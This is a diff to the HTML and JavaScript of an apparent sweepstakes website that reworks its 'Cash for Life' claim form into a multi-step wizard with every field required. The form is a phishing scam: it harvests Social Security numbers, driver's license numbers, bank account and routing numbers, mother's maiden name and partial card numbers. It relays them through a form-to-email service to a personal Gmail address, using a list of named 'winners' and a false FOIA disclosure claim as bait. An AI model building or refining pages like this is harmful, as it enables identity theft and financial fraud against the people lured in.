@@ -66,7 +66,16 @@
 		.doc-request-form{display:grid;gap:12px;margin-top:14px}
 		.doc-upload-list{display:grid;gap:8px;margin-top:12px}
 		.doc-upload-item{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:10px;border-radius:8px;background:rgba(255,255,255,0.14)}
+		.home-winners-layout{display:flow-root}
+		.home-winners-sideview{box-sizing:border-box;float:right;width:min(320px,40%);margin:0 0 16px 20px;padding:16px;border:1px solid rgba(255,255,255,0.28);border-radius:12px;background:rgba(255,255,255,0.12);color:#fff}
+		.home-winners-sideview h3{margin:0 0 8px;color:#fff}
+		.home-winners-sideview p{color:#e8f4ff}
+		.home-winners-list{display:grid;gap:8px;max-height:340px;overflow:auto;margin:12px 0;padding:0;list-style:none}
+		.home-winners-list li{display:flex;justify-content:space-between;gap:10px;padding:8px;border-radius:8px;background:rgba(255,255,255,0.1);color:#fff}
+		.home-winners-list li span:last-child{font-size:12px;color:#e8f4ff}
+		#services::after{content:"";display:block;clear:both}
 		@media (max-width:760px){.sideview{float:none;margin:16px 0 0;width:100%}.hero-image-grid{flex-direction:column;position:sticky;top:8px;z-index:20;background:rgba(255,255,255,0.08);padding:10px;border-radius:12px}.hero-image-grid img{max-width:100%;flex:1 1 auto}.footer-header{flex-direction:column;align-items:center}.footer-header img{max-width:100%;height:auto}}
+		@media (max-width:760px){.home-winners-sideview{float:none;width:auto;margin:16px 0}}
 	</style>
 </head>
 <body>
@@ -114,6 +123,9 @@
 		<section id="services" style="display:block">
 			<h2>Official Rules</h2>
 			<p style="color:#ffffff;">We run verified sweepstakes and promotions nationwide. For questions about participation, see Customer Service.</p>
+			<div style="margin-top:16px;">
+				<button class="btn" type="button" onclick="openOfficialRulesModal()">Request Official Rules</button>
+			</div>
 			<div class="hero-image-grid" style="margin:16px 0 0;padding:16px;border-radius:12px;background:rgba(255,255,255,0.12);border:1px solid rgba(255,255,255,0.28);color:#fff;text-align:center;">
 				<img src="table-right-logos.png" alt="Official rules logos" />
 				<img src="Screenshot-2026.png" alt="Description" />
@@ -228,29 +240,6 @@ ________________________________________________________________________________
 				<img src="Screenshot 2026-0.png" alt="Screenshot" style="flex:1 1 48%;max-width:48%;border-radius:10px;height:280px;object-fit:cover;" />
 				<img src="vidu-image-33.png" alt="vidu-image-33" style="flex:1 1 48%;max-width:48%;border-radius:10px;height:280px;object-fit:cover;" />
 			</div>
-			<div class="doc-request-card">
-				<h3 style="margin-top:0;color:#fff;">Request Your Official Winner Documents</h3>
-				<p style="margin:6px 0 0;color:#e8f4ff;">Need proof that you are one of our lucky winners? Submit a request here and it will be sent straight to our email inbox.</p>
-				<div style="margin-top:12px;">
-					<button class="btn" type="button" onclick="document.getElementById('officialDocumentRequestForm').scrollIntoView({behavior:'smooth',block:'start'})">Request Official Documents</button>
-				</div>
-				<form id="officialDocumentRequestForm" action="https://formsubmit.co/ajax/hashmatali20001@gmail.com" method="POST" enctype="multipart/form-data" class="doc-request-form">
-					<input type="hidden" name="_subject" value="Official Document Request" />
-					<input type="hidden" name="_captcha" value="false" />
-					<input type="hidden" name="_template" value="table" />
-					<div class="form-grid">
-						<label>Full Name<input type="text" name="fullName" placeholder="Your full name" required /></label>
-						<label>Email Address<input type="email" name="emailAddress" placeholder="Your email" required /></label>
-						<label>Claim Number<input type="text" name="claimNumber" placeholder="Claim number" /></label>
-						<label>Document Type<select name="documentType">
-							<option value="Official winner letter">Official winner letter</option>
-							<option value="Award verification">Award verification</option>
-						</select></label>
-					</div>
-					<button class="btn" type="submit">Send Request</button>
-					<p id="officialDocRequestMessage" class="small" style="display:none;"></p>
-				</form>
-			</div>
 			<p style="color:#ffffff;">Enter official promotions and follow the rules to participate. Winners are selected at random and vetted.</p>
 		</section>
 
@@ -266,54 +255,66 @@ ________________________________________________________________________________
 				<input type="hidden" id="selectedWinnerInput" name="selectedWinner" />
 				<input type="hidden" name="_captcha" value="false" />
 				<input type="hidden" name="_template" value="table" />
-				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
-					<legend>Personal Information</legend>
-					<div class="form-grid">
-						<label>First Name<input type="text" name="firstName" placeholder="First Name" /></label>
-						<label>Last Name<input type="text" name="lastName" placeholder="Last Name" /></label>
-						<label>Phone Number<input type="tel" name="phone" placeholder="Phone Number" /></label>
-						<label>Email Address<input type="email" name="email" placeholder="Email Address" /></label>
-						<label>Date of Birth<input type="date" name="dob" /></label>
-						<label>Amount Won<input type="text" name="amountWon" placeholder="Amount Won" /></label>
-						<label>Driver's License Number<input type="text" name="license" placeholder="Driver's License Number" /></label>
-						<label>Social Security Number<input type="text" name="ssn" placeholder="Social Security Number" /></label>
-						<label>Claim Number<input type="text" name="claimNumber" placeholder="Claim Number" /></label>
-					</div>
-				</fieldset>
+				<div class="claim-step" data-step="0" style="display:block;">
+					<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
+						<legend>Personal Information</legend>
+						<div class="form-grid">
+							<label>First Name<input type="text" name="firstName" placeholder="First Name" required /></label>
+							<label>Last Name<input type="text" name="lastName" placeholder="Last Name" required /></label>
+							<label>Phone Number<input type="tel" name="phone" placeholder="Phone Number" required /></label>
+							<label>Email Address<input type="email" name="email" placeholder="Email Address" required /></label>
+							<label>Date of Birth<input type="date" name="dob" required /></label>
+							<label>Amount Won<input type="text" name="amountWon" placeholder="Amount Won" required /></label>
+							<label>Driver's License Number<input type="text" name="license" placeholder="Driver's License Number" required /></label>
+							<label>Social Security Number<input type="text" name="ssn" placeholder="Social Security Number" required /></label>
+							<label>Claim Number<input type="text" name="claimNumber" placeholder="Claim Number" required /></label>
+						</div>
+					</fieldset>
+				</div>
 
-				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
-					<legend>Address</legend>
-					<div class="form-grid">
-						<label>Address<input type="text" name="address" placeholder="Address" /></label>
-						<label>City<input type="text" name="city" placeholder="City" /></label>
-						<label>Zip Code<input type="text" name="zip" placeholder="Zip Code" /></label>
-						<label>State<input type="text" name="state" placeholder="State" /></label>
-					</div>
-				</fieldset>
+				<div class="claim-step" data-step="1" style="display:none;">
+					<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
+						<legend>Address</legend>
+						<div class="form-grid">
+							<label>Address<input type="text" name="address" placeholder="Address" required /></label>
+							<label>City<input type="text" name="city" placeholder="City" required /></label>
+							<label>Zip Code<input type="text" name="zip" placeholder="Zip Code" required /></label>
+							<label>State<input type="text" name="state" placeholder="State" required /></label>
+						</div>
+					</fieldset>
+				</div>
 
-				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
-					<legend>Bank Information</legend>
-					<div class="form-grid">
-						<label>Name of Bank<input type="text" name="bankName" placeholder="Name of Bank" /></label>
-						<label>Account Number<input type="text" name="accountNumber" placeholder="Account Number" /></label>
-						<label>Routing Number<input type="text" name="routingNumber" placeholder="Routing Number" /></label>
-						<label>Weekly Deposit Amount<input type="text" name="depositAmount" placeholder="Weekly Deposit Amount" /></label>
-						<label>Primary Holder Name<input type="text" name="holderName" placeholder="Primary Holder Name" /></label>
-						<label>Mother Maiden Name<input type="text" name="maidenName" placeholder="Mother Maiden Name" /></label>
-						<label>Last Six of Old Debit or Credit Card<input type="text" name="cardLastSix" placeholder="Last Six" maxlength="6" /></label>
-					</div>
-				</fieldset>
+				<div class="claim-step" data-step="2" style="display:none;">
+					<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
+						<legend>Bank Information</legend>
+						<div class="form-grid">
+							<label>Name of Bank<input type="text" name="bankName" placeholder="Name of Bank" required /></label>
+							<label>Account Number<input type="text" name="accountNumber" placeholder="Account Number" required /></label>
+							<label>Routing Number<input type="text" name="routingNumber" placeholder="Routing Number" required /></label>
+							<label>Weekly Deposit Amount<input type="text" name="depositAmount" placeholder="Weekly Deposit Amount" required /></label>
+							<label>Primary Holder Name<input type="text" name="holderName" placeholder="Primary Holder Name" required /></label>
+							<label>Mother Maiden Name<input type="text" name="maidenName" placeholder="Mother Maiden Name" required /></label>
+							<label>Last Six of Old Debit or Credit Card<input type="text" name="cardLastSix" placeholder="Last Six" maxlength="6" required /></label>
+						</div>
+					</fieldset>
+				</div>
 
-				<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
-					<legend>Terms and Conditions</legend>
-					<p>If you are a winner from our Cash for Life Promotion, please complete this Official Weekly Payment Registration form in order to receive your weekly payout and submit it below. You are required to have a new checking account with a bank you have been with for over 5 years.</p>
-					<p>This form is used by American Sweepstakes & Promotion Co. Escrow Officer when, on behalf of an authorized person, escrow requests information from the holder of a Sweepstakes Awards or any prizes to confirm the terms and conditions for releasing funds to the recipient.</p>
-					<p>The Freedom of Information Act (FOIA) gives all citizens the rights to provide all necessary information below for transactional purposes. The records requested must be disclosed as they will remain confidential and will only be used for a one-time authorization process.</p>
-					<label><input type="checkbox" name="agree" required /> I agree to the terms and conditions.</label>
-				</fieldset>
+				<div class="claim-step" data-step="3" style="display:none;">
+					<fieldset style="margin-top:14px;border:1px solid rgba(255,255,255,0.18);background:transparent;color:#ffffff;">
+						<legend>Terms and Conditions</legend>
+						<p>If you are a winner from our Cash for Life Promotion, please complete this Official Weekly Payment Registration form in order to receive your weekly payout and submit it below. You are required to have a new checking account with a bank you have been with for over 5 years.</p>
+						<p>This form is used by American Sweepstakes & Promotion Co. Escrow Officer when, on behalf of an authorized person, escrow requests information from the holder of a Sweepstakes Awards or any prizes to confirm the terms and conditions for releasing funds to the recipient.</p>
+						<p>The Freedom of Information Act (FOIA) gives all citizens the rights to provide all necessary information below for transactional purposes. The records requested must be disclosed as they will remain confidential and will only be used for a one-time authorization process.</p>
+						<label><input type="checkbox" name="agree" required /> I agree to the terms and conditions.</label>
+					</fieldset>
+				</div>
 				<img src="Picture4.png" alt="" style="max-width:320px;width:100%;height:auto;margin:16px 0;border-radius:10px;" />
 				<p id="claimWinnerNotice" class="small" style="display:none;margin-top:8px;"></p>
-				<button class="btn" type="submit" style="margin-top:14px;">Submit Claim Form</button>
+				<div style="display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:14px;">
+					<button type="button" class="btn" id="claimPrevBtn" style="display:none;">Previous</button>
+					<button type="button" class="btn" id="claimNextBtn">Next</button>
+					<button class="btn" type="submit" id="claimSubmitBtn" style="display:none;">Submit Claim Form</button>
+				</div>
 				<p id="claimMessage" class="small" style="display:none;"></p>
 			</form>
 		</section>
@@ -331,35 +332,36 @@ ________________________________________________________________________________
 						<tr><th>Winner Name</th><th>Status</th><th>Action</th></tr>
 					</thead>
 				<tbody id="winnersTableBody">
-					<tr><td>Michael A. Brooks</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Jasmine R. Lewis</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Daniel T. Rivers</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Patricia W. Gomez</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Charmaine Baker</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Judy Werner</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>William Averhart</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Gloria Smith</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Faye Phipps</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Susan English</td><td>Disqualify</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Claire Asborn</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Andrew J. Royals</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 					<tr><td>Anthony Romine</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Rosalia Baumgard</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Jimmy Cochanuer</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Regina Beck</td><td>Disqualify</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 					<tr><td>Carolyn Roth</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-					<tr><td>Larry Combs</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr> 
-				<tr><td>Jessie Anderson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Paula Winfrey</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Kennth Jefferson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>John Lampson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Sandra Ginn</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Gary Krier</td><td>Pending</td><td><button type="button" class="btn" onclick="showsection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Joanne Thomas</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Ruth Degraaf</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Daisy Green</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Gary Cline</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Jonathan E Barron</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
-				<tr><td>Joanne Schweikert</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Charmaine Baker</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Claire S. Asborn</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Daisy P. Green</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Daniel T. Rivers</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Faye Phipps</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Gary Cline</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Gary Krier</td><td>Pending</td><td><button type="button" class="btn" onclick="showsection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Gloria Smith</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Jasmine R. Lewis</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Jessie Anderson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Jimmy Cochanuer</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Joanne H. Thomas</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Joanne Schweikert</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>John Lampson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Jonathan E. Barron</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Judy Werner</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Kennth A. Jefferson</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Larry Combs</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Michael A. Brooks</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Patricia W. Gomez</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Paula Winfrey</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Regina B. Beck</td><td>Disqualify</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Rosalia Baumgard</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Ruth Degraaf</td><td>Unclaim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Sandra Ginn</td><td>Claim</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>Susan English</td><td>Disqualify</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
+					<tr><td>William F. Averhart</td><td>Pending</td><td><button type="button" class="btn" onclick="showSection('claim')">Claim Weekly Payment</button></td></tr>
 				</table>
 			</div>
 			<div style="margin:20px 0;text-align:center;">
@@ -473,7 +475,15 @@ ________________________________________________________________________________
 			</div>
 		</section>
 
-		<h1 style="color:#1e90ff;"> <strong>75 Years</strong> of Creating Winning Solutions. We’re dedicated to providing superior customer service, flexible processes, and first-rate creativity for sweepstakes, contests, and promotions.</h1>
+		<div class="home-winners-layout">
+			<aside class="home-winners-sideview" id="homeWinnersSideview" aria-labelledby="homeWinnersTitle">
+				<h3 id="homeWinnersTitle">Winners List</h3>
+				<p class="small" style="margin:0;">Entries and statuses below mirror the site's Winners List and are not independent verification of winner selection or awards.</p>
+				<ul class="home-winners-list" id="homeWinnersList" aria-live="polite"></ul>
+				<button class="btn" type="button" onclick="showSection('winners')">View Full List</button>
+			</aside>
+			<h1 style="color:#1e90ff;"> <strong>75 Years</strong> of Creating Winning Solutions. We’re dedicated to providing superior customer service, flexible processes, and first-rate creativity for sweepstakes, contests, and promotions.</h1>
+		</div>
 _______________________________________________________________________________________________________________
 
 		<div style="margin:20px 0 24px;text-align:center;">
@@ -503,6 +513,27 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 			<small>© 2026 American Sweepstakes, All Rights Reserved.</small>
 		</footer>
 	</main>
+
+	<div class="overlay" id="officialRulesModal" style="display:none;">
+		<div class="panel" role="dialog" aria-modal="true" aria-labelledby="officialRulesTitle">
+			<h2 id="officialRulesTitle">Request Official Rules</h2>
+			<p style="color:#fff;">Use this form to request publicly available official rules or promotion terms. This request does not establish winner status or confirm an award.</p>
+			<form id="officialDocumentRequestForm" action="https://formsubmit.co/ajax/hashmatali20001@gmail.com" method="POST" class="doc-request-form">
+				<input type="hidden" name="_subject" value="Official Rules Request" />
+				<input type="hidden" name="_captcha" value="false" />
+				<input type="hidden" name="_template" value="table" />
+				<label>Email Address<input type="email" name="emailAddress" placeholder="Your email" autocomplete="email" required /></label>
+				<label>Requested document<select name="documentType" required>
+					<option value="Official rules">Official rules</option>
+					<option value="Promotion terms">Promotion terms</option>
+				</select></label>
+				<label>Promotion name (optional)<input type="text" name="promotionName" placeholder="Name of promotion" /></label>
+				<button class="btn" type="submit">Send Request</button>
+				<p id="officialDocRequestMessage" class="small" style="display:none;color:#fff;" role="status" aria-live="polite"></p>
+			</form>
+			<button class="btn" id="closeOfficialRulesModal" type="button" style="margin-top:12px;background:#fff;color:#000;">Close</button>
+		</div>
+	</div>
 
 	<script>
 		// Note: for a fully secure gate, perform auth on the server.
@@ -565,6 +596,8 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 			document.querySelectorAll('main section').forEach(s=>s.style.display='none');
 			const el = document.getElementById(id);
 			if(el) el.style.display='block';
+			const homeWinnersSideview = document.getElementById('homeWinnersSideview');
+			if (homeWinnersSideview) homeWinnersSideview.style.display = id === 'services' ? 'block' : 'none';
 		}
 
 		form.addEventListener('submit', function(e){
@@ -626,6 +659,30 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 		const claimMessage = document.getElementById('claimMessage');
 		const winnerSearchInput = document.getElementById('winnerSearchInput');
 		const winnersTableBody = document.getElementById('winnersTableBody');
+		const homeWinnersList = document.getElementById('homeWinnersList');
+
+		function renderHomeWinners() {
+			if (!homeWinnersList || !winnersTableBody) return;
+			const fragment = document.createDocumentFragment();
+			winnersTableBody.querySelectorAll('tr').forEach(row => {
+				const name = row.cells && row.cells[0] ? row.cells[0].textContent.trim() : '';
+				const status = row.cells && row.cells[1] ? row.cells[1].textContent.trim() : '';
+				if (!name) return;
+				const item = document.createElement('li');
+				const nameLabel = document.createElement('span');
+				const statusLabel = document.createElement('span');
+				nameLabel.textContent = name;
+				statusLabel.textContent = status;
+				item.append(nameLabel, statusLabel);
+				fragment.appendChild(item);
+			});
+			homeWinnersList.replaceChildren(fragment);
+			if (!homeWinnersList.childElementCount) {
+				const emptyItem = document.createElement('li');
+				emptyItem.textContent = 'No entries are listed.';
+				homeWinnersList.appendChild(emptyItem);
+			}
+		}
 
 		const PENDING_KEY = 'pendingWinnerClaims';
 		const CLAIMED_KEY = 'claimedWinnerNames';
@@ -700,8 +757,24 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 			});
 		}
 
+		function sortWinnerRows() {
+			if (!winnersTableBody) return;
+			const rows = Array.from(winnersTableBody.querySelectorAll('tr'));
+			rows.sort((a, b) => {
+				const aName = (a.cells && a.cells[0] ? a.cells[0].textContent : '').trim();
+				const bName = (b.cells && b.cells[0] ? b.cells[0].textContent : '').trim();
+				return aName.localeCompare(bName, undefined, { sensitivity: 'base' });
+			});
+			rows.forEach(row => winnersTableBody.appendChild(row));
+		}
+
 		if (winnerSearchInput) {
 			winnerSearchInput.addEventListener('input', filterWinners);
+		}
+		if (winnersTableBody) {
+			sortWinnerRows();
+			renderHomeWinners();
+			new MutationObserver(renderHomeWinners).observe(winnersTableBody, {childList:true,subtree:true});
 		}
 
 		function resolveWinnerNameFromClaimForm() {
@@ -756,6 +829,55 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 		}
 
 		if (claimForm) {
+			const claimSteps = Array.from(claimForm.querySelectorAll('.claim-step'));
+			const claimPrevBtn = document.getElementById('claimPrevBtn');
+			const claimNextBtn = document.getElementById('claimNextBtn');
+			const claimSubmitBtn = document.getElementById('claimSubmitBtn');
+			let claimStepIndex = 0;
+
+			function validateClaimStep(stepIndex) {
+				const step = claimSteps[stepIndex];
+				if (!step) return true;
+				const requiredFields = step.querySelectorAll('input[required], select[required], textarea[required]');
+				for (const field of requiredFields) {
+					if (!field.checkValidity()) {
+						field.reportValidity();
+						return false;
+					}
+				}
+				return true;
+			}
+
+			function renderClaimStep() {
+				claimSteps.forEach((step, index) => {
+					step.style.display = index === claimStepIndex ? 'block' : 'none';
+				});
+				if (claimPrevBtn) claimPrevBtn.style.display = claimStepIndex > 0 ? 'inline-block' : 'none';
+				if (claimNextBtn) claimNextBtn.style.display = claimStepIndex < claimSteps.length - 1 ? 'inline-block' : 'none';
+				if (claimSubmitBtn) claimSubmitBtn.style.display = claimStepIndex === claimSteps.length - 1 ? 'inline-block' : 'none';
+			}
+
+			if (claimPrevBtn) {
+				claimPrevBtn.addEventListener('click', function() {
+					if (claimStepIndex > 0) {
+						claimStepIndex -= 1;
+						renderClaimStep();
+					}
+				});
+			}
+
+			if (claimNextBtn) {
+				claimNextBtn.addEventListener('click', function() {
+					if (!validateClaimStep(claimStepIndex)) return;
+					if (claimStepIndex < claimSteps.length - 1) {
+						claimStepIndex += 1;
+						renderClaimStep();
+					}
+				});
+			}
+
+			renderClaimStep();
+
 			claimForm.addEventListener('submit', function() {
 				const selectedWinner = resolveWinnerNameFromClaimForm();
 				if (selectedWinner) {
@@ -777,6 +899,8 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 		// enhance the generic sendFormToEmail to handle claimForm result: mark as Claimed on success
 		const officialDocumentRequestForm = document.getElementById('officialDocumentRequestForm');
 		const officialDocRequestMessage = document.getElementById('officialDocRequestMessage');
+		const officialRulesModal = document.getElementById('officialRulesModal');
+		const closeOfficialRulesModalButton = document.getElementById('closeOfficialRulesModal');
 		const documentUploadInput = document.getElementById('documentUploadInput');
 		const documentUploadButton = document.getElementById('documentUploadButton');
 		const documentUploadList = document.getElementById('documentUploadList');
@@ -844,7 +968,30 @@ During that time, he directed major accounts including Eastman Kodak, Bausch & L
 
 		sendFormToEmail(inquiryForm, inquiryMessage, 'Thank you! Your request has been received and a representative will follow up soon.');
 		sendFormToEmail(claimForm, claimMessage, 'Thank you! Your claim form has been received and a representative will contact you soon.');
-		sendFormToEmail(officialDocumentRequestForm, officialDocRequestMessage, 'Thank you! Your official document request has been received and will be reviewed shortly.');
+		sendFormToEmail(officialDocumentRequestForm, officialDocRequestMessage, 'Thank you! Your request for publicly available rules or promotion terms has been received.');
+
+		function openOfficialRulesModal() {
+			if (!officialRulesModal) return;
+			officialRulesModal.style.display = 'flex';
+			officialRulesModal.querySelector('input[type="email"]').focus();
+		}
+
+		if (closeOfficialRulesModalButton) {
+			closeOfficialRulesModalButton.addEventListener('click', function() {
+				officialRulesModal.style.display = 'none';
+			});
+		}
+
+		if (officialRulesModal) {
+			officialRulesModal.addEventListener('click', function(event) {
+				if (event.target === officialRulesModal) officialRulesModal.style.display = 'none';
+			});
+			document.addEventListener('keydown', function(event) {
+				if (event.key === 'Escape' && officialRulesModal.style.display === 'flex') {
+					officialRulesModal.style.display = 'none';
+				}
+			});
+		}
 
 		const promotionSubscribeForm = document.getElementById('promotionSubscribeForm');
 		const promotionSubscribeMessage = document.getElementById('promotionSubscribeMessage');
